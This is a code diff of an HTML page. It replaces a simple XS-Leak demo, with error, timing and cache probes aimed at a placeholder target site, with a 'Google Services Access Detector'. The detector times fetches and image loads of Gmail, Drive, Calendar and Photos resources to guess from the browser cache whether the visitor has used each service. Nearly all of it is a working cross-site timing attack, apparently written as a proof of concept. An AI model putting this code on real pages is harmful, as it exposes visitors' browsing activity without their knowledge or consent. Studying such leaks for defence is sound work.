@@ -1,49 +1,131 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Google Ecosystem Detection</title>
+    <style>
+        .service { margin: 15px 0; padding: 15px; border-radius: 8px; }
+        .gmail { background: #ffebee; }
+        .drive { background: #e8eaf6; }
+        .calendar { background: #e8f5e8; }
+        .photos { background: #f3e5f5; }
+    </style>
+</head>
 <body>
+    <h1>Google Services Access Detector</h1>
+    <button onclick="detectAllServices()">Scan Google Services Access</button>
+    <div id="serviceResults"></div>
+
 <script>
-// Error-based XS-Leak
-function errorBasedLeak() {
-    const targetUrl = 'https://target-site.com/private-page';
-    
-    // Coba detect error messages
-    fetch(targetUrl)
-    .then(response => {
-        if (!response.ok) {
-            // Error status bisa leak information
-            console.log('Status:', response.status);
+async function detectAllServices() {
+    const services = [
+        {
+            name: 'Gmail',
+            resources: [
+                'https://mail.google.com/mail/u/0/',
+                'https://mail.google.com/mail/images/cleardot.gif'
+            ],
+            threshold: 80
+        },
+        {
+            name: 'Google Drive', 
+            resources: [
+                'https://drive.google.com/drive/u/0/',
+                'https://drive.google.com/static/images/drive_logo.png'
+            ],
+            threshold: 100
+        },
+        {
+            name: 'Google Calendar',
+            resources: [
+                'https://calendar.google.com/calendar/u/0/',
+                'https://calendar.google.com/googlecalendar/images/favicon_v2014.ico'
+            ],
+            threshold: 90
+        },
+        {
+            name: 'Google Photos',
+            resources: [
+                'https://photos.google.com/',
+                'https://photos.google.com/favicon.ico' 
+            ],
+            threshold: 85
         }
-    })
-    .catch(error => {
-        // Network errors bisa juga leak info
-        console.log('Error type:', error.name);
-    });
+    ];
+
+    for (const service of services) {
+        const result = await analyzeService(service);
+        displayServiceResult(service, result);
+    }
 }
 
-// Timing-based XS-Leak  
-function timingLeak() {
-    const start = performance.now();
+async function analyzeService(service) {
+    let cachedCount = 0;
+    let totalTime = 0;
     
-    fetch('https://target-site.com/resource')
-    .then(() => {
-        const duration = performance.now() - start;
-        console.log('Load time:', duration);
-        // Timing differences bisa detect user state
-    });
+    for (const resource of service.resources) {
+        const timing = await measureLoadTimeAdvanced(resource);
+        totalTime += timing;
+        
+        if (timing < service.threshold) {
+            cachedCount++;
+        }
+    }
+    
+    const avgTime = totalTime / service.resources.length;
+    const confidence = cachedCount / service.resources.length;
+    
+    return { avgTime, confidence, cachedCount };
 }
 
-// Cache-based XS-Leak
-function cacheLeak() {
-    const img = new Image();
-    const start = performance.now();
+async function measureLoadTimeAdvanced(url) {
+    // Advanced measurement dengan multiple techniques
+    const techniques = [];
     
-    img.src = 'https://target-site.com/cached-resource';
-    img.onload = () => {
-        const loadTime = performance.now() - start;
-        console.log('Cached load time:', loadTime);
-    };
+    // Technique 1: Direct fetch
+    const start1 = performance.now();
+    try {
+        await fetch(url, { mode: 'no-cors', cache: 'no-cache' });
+    } catch(e) {}
+    techniques.push(performance.now() - start1);
+    
+    // Technique 2: Image load
+    const start2 = performance.now();
+    await new Promise((resolve) => {
+        const img = new Image();
+        img.onload = img.onerror = resolve;
+        img.src = url + '?t=' + Date.now();
+    });
+    techniques.push(performance.now() - start2);
+    
+    // Return fastest time (most optimistic for detection)
+    return Math.min(...techniques);
+}
+
+function displayServiceResult(service, result) {
+    const resultsDiv = document.getElementById('serviceResults');
+    let status, emoji;
+    
+    if (result.confidence > 0.5) {
+        status = 'LIKELY ACCESSED';
+        emoji = '🚨';
+    } else if (result.confidence > 0.2) {
+        status = 'POSSIBLY ACCESSED';
+        emoji = '⚠️';
+    } else {
+        status = 'UNLIKELY ACCESSED';
+        emoji = '✅';
+    }
+    
+    resultsDiv.innerHTML += `
+        <div class="service ${service.name.toLowerCase().replace(' ', '')}">
+            <h3>${emoji} ${service.name}</h3>
+            Status: <strong>${status}</strong><br>
+            Confidence: ${(result.confidence * 100).toFixed(1)}%<br>
+            Average Load Time: ${result.avgTime.toFixed(2)}ms<br>
+            Cached Resources: ${result.cachedCount}/${service.resources.length}
+        </div>
+    `;
 }
 </script>
-<button onclick="errorBasedLeak()">Test XS-Leak</button>
 </body>
 </html>
